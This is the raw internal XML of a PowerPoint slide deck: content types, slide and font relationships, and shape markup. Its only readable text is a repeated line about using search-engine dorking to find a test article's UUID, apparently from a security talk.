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7.xml"/>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84.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide3.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide76.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68.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82.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide85.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77.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86.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide1.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide73.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide56.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide81.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide30.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide69.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80.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide61.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide74.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide87.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide57.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide44.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide58.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide27.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide88.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide14.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide75.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62.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45.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide70.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89.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide11.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide63.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72.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60.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide38.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide64.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65.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide78.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide79.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83.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml" PartName="/ppt/notesSlides/notesSlide71.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66.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78.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide86.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide35.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide60.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69.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide85.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77.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6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84.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide37.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide71.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide41.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide67.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide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66.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide79.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83.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide70.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide6.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide53.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73.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82.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide39.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide65.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72.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64.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide81.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide8.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59.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide89.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide32.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide62.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide75.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide76.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide1.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide58.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide63.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80.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide15.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide61.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide31.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide87.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide74.xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml" PartName="/ppt/slides/slide88.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 id="304" r:id="rId54"/>
    <p:sldId id="305" r:id="rId55"/>
    <p:sldId id="306" r:id="rId56"/>
    <p:sldId id="307" r:id="rId57"/>
    <p:sldId id="308" r:id="rId58"/>
    <p:sldId id="309" r:id="rId59"/>
    <p:sldId id="310" r:id="rId60"/>
    <p:sldId id="311" r:id="rId61"/>
    <p:sldId id="312" r:id="rId62"/>
    <p:sldId id="313" r:id="rId63"/>
    <p:sldId id="314" r:id="rId64"/>
    <p:sldId id="315" r:id="rId65"/>
    <p:sldId id="316" r:id="rId66"/>
    <p:sldId id="317" r:id="rId67"/>
    <p:sldId id="318" r:id="rId68"/>
    <p:sldId id="319" r:id="rId69"/>
    <p:sldId id="320" r:id="rId70"/>
    <p:sldId id="321" r:id="rId71"/>
    <p:sldId id="322" r:id="rId72"/>
    <p:sldId id="323" r:id="rId73"/>
    <p:sldId id="324" r:id="rId74"/>
    <p:sldId id="325" r:id="rId75"/>
    <p:sldId id="326" r:id="rId76"/>
    <p:sldId id="327" r:id="rId77"/>
    <p:sldId id="328" r:id="rId78"/>
    <p:sldId id="329" r:id="rId79"/>
    <p:sldId id="330" r:id="rId80"/>
    <p:sldId id="331" r:id="rId81"/>
    <p:sldId id="332" r:id="rId82"/>
    <p:sldId id="333" r:id="rId83"/>
    <p:sldId id="334" r:id="rId84"/>
    <p:sldId id="335" r:id="rId85"/>
    <p:sldId id="336" r:id="rId86"/>
    <p:sldId id="337" r:id="rId87"/>
    <p:sldId id="338" r:id="rId88"/>
    <p:sldId id="339" r:id="rId89"/>
    <p:sldId id="340" r:id="rId90"/>
    <p:sldId id="341" r:id="rId91"/>
    <p:sldId id="342" r:id="rId92"/>
    <p:sldId id="343" r:id="rId93"/>
    <p:sldId id="344" r:id="rId94"/>
  </p:sldIdLst>
  <p:sldSz cy="5143500" cx="9144000"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:embeddedFontLst>
    <p:embeddedFont>
      <p:font typeface="Abhaya Libre SemiBold"/>
      <p:regular r:id="rId95"/>
      <p:bold r:id="rId96"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Russo One"/>
      <p:regular r:id="rId97"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Abhaya Libre ExtraBold"/>
      <p:bold r:id="rId98"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Abhaya Libre"/>
      <p:regular r:id="rId99"/>
      <p:bold r:id="rId100"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Abhaya Libre Medium"/>
      <p:regular r:id="rId101"/>
      <p:bold r:id="rId102"/>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slide" Target="slides/slide39.xml"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide38.xml"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide41.xml"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide40.xml"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide43.xml"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide42.xml"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide44.xml"/><Relationship Id="rId102" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/AbhayaLibreMedium-bold.fntdata"/><Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/AbhayaLibreMedium-regular.fntdata"/><Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/AbhayaLibre-bold.fntdata"/><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32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide27.xml"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide30.xml"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide29.xml"/><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95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/AbhayaLibreSemiBold-regular.fntdata"/><Relationship Id="rId94" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide89.xml"/><Relationship Id="rId97" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/RussoOne-regular.fntdata"/><Relationship Id="rId96" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/AbhayaLibreSemiBold-bold.fntdata"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide6.xml"/><Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/AbhayaLibre-regular.fntdata"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide5.xml"/><Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/AbhayaLibreExtraBold-bold.fntdata"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide8.xml"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide7.xml"/><Relationship Id="rId91" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide86.xml"/><Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide85.xml"/><Relationship Id="rId93" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide88.xml"/><Relationship Id="rId92" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide8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 Id="rId84" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide79.xml"/><Relationship Id="rId83" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide78.xml"/><Relationship Id="rId86" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide81.xml"/><Relationship Id="rId85" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide80.xml"/><Relationship Id="rId88" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide83.xml"/><Relationship Id="rId87" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide82.xml"/><Relationship Id="rId89" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide84.xml"/><Relationship Id="rId80" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide75.xml"/><Relationship Id="rId82" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide77.xml"/><Relationship Id="rId81" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide76.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73" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide68.xml"/><Relationship Id="rId72" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide67.xml"/><Relationship Id="rId75" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide70.xml"/><Relationship Id="rId74" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide69.xml"/><Relationship Id="rId77" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide72.xml"/><Relationship Id="rId76" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide71.xml"/><Relationship Id="rId79" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide74.xml"/><Relationship Id="rId78" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide73.xml"/><Relationship Id="rId71" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide66.xml"/><Relationship Id="rId70" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide65.xml"/><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide57.xml"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide56.xml"/><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide59.xml"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide58.xml"/><Relationship Id="rId66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide61.xml"/><Relationship Id="rId65" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide60.xml"/><Relationship Id="rId68" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide63.xml"/><Relationship Id="rId67" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide62.xml"/><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide55.xml"/><Relationship Id="rId69" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide64.xml"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide46.xml"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide45.xml"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide48.xml"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide47.xml"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide50.xml"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide49.xml"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide52.xml"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide51.xml"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide54.xml"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide5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 name="Shape 56"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Google Shape;57;g258cbd63437_0_7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 name="Google Shape;58;g258cbd63437_0_7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 name="Shape 64"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="Google Shape;65;g258cbd63437_0_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6" name="Google Shape;66;g258cbd63437_0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 name="Shape 73"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="Google Shape;74;g258cbd63437_0_7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5" name="Google Shape;75;g258cbd63437_0_7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 name="Shape 82"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="Google Shape;83;g2590d782a6e_0_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4" name="Google Shape;84;g2590d782a6e_0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 name="Shape 89"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="Google Shape;90;g28d5137f758_0_3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1" name="Google Shape;91;g28d5137f758_0_3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 name="Shape 98"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Google Shape;99;g2590d782a6e_0_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0" name="Google Shape;100;g2590d782a6e_0_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 name="Shape 107"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108" name="Google Shape;108;g28d5137f758_0_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9" name="Google Shape;109;g28d5137f758_0_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 name="Shape 117"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="118" name="Google Shape;118;g28d5137f758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9" name="Google Shape;119;g28d5137f758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 name="Shape 126"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="127" name="Google Shape;127;g2590d782a6e_0_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8" name="Google Shape;128;g2590d782a6e_0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 name="Shape 135"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="136" name="Google Shape;136;g28d5137f758_0_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7" name="Google Shape;137;g28d5137f758_0_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g28d5137f758_0_5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6" name="Google Shape;146;g28d5137f758_0_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 name="Shape 155"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="156" name="Google Shape;156;g28d5137f758_0_3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7" name="Google Shape;157;g28d5137f758_0_3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 name="Shape 162"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163" name="Google Shape;163;g28d5137f758_0_7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4" name="Google Shape;164;g28d5137f758_0_7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1" name="Shape 171"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="172" name="Google Shape;172;g28d5137f758_0_8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3" name="Google Shape;173;g28d5137f758_0_8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0" name="Shape 180"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="181" name="Google Shape;181;g28d5137f758_0_9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2" name="Google Shape;182;g28d5137f758_0_9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 name="Shape 189"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="190" name="Google Shape;190;g28d5137f758_0_1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1" name="Google Shape;191;g28d5137f758_0_1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8" name="Shape 198"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="199" name="Google Shape;199;g28d5137f758_0_1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0" name="Google Shape;200;g28d5137f758_0_1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7" name="Shape 207"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208" name="Google Shape;208;g28d5137f758_0_10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9" name="Google Shape;209;g28d5137f758_0_10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6" name="Shape 216"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="217" name="Google Shape;217;g28d5137f758_0_1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8" name="Google Shape;218;g28d5137f758_0_1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5" name="Shape 225"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="226" name="Google Shape;226;g28d5137f758_0_1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7" name="Google Shape;227;g28d5137f758_0_1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4" name="Shape 234"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="235" name="Google Shape;235;g28d5137f758_0_15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6" name="Google Shape;236;g28d5137f758_0_1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b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>I google-dorked and found a news article that had been used for testing and grabbed the UUID.</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>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3" name="Shape 243"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="244" name="Google Shape;244;g28d5137f758_0_16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5" name="Google Shape;245;g28d5137f758_0_1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b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>I google-dorked and found a news article that had been used for testing and grabbed the UUID.</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
